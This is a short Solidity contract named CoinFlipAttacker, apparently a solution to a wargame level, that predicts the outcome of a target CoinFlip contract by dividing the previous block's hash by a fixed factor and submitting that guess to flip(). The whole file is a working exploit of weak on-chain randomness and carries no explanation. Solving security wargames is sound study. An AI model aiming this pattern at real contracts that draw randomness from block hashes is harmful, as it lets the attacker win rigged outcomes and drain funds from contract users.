pragma solidity ^0.8.0;

interface CoinFlip {
    function flip(bool _guess) external returns (bool);
    function consecutiveWins() external view returns (uint256);
}


contract CoinFlipAttacker {
    uint256 private constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip public instance;

    constructor(address _instance) {
        instance = CoinFlip(_instance);
    }

    function attack() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool guess = coinFlip == 1 ? true : false;
        instance.flip(guess);
    }
}
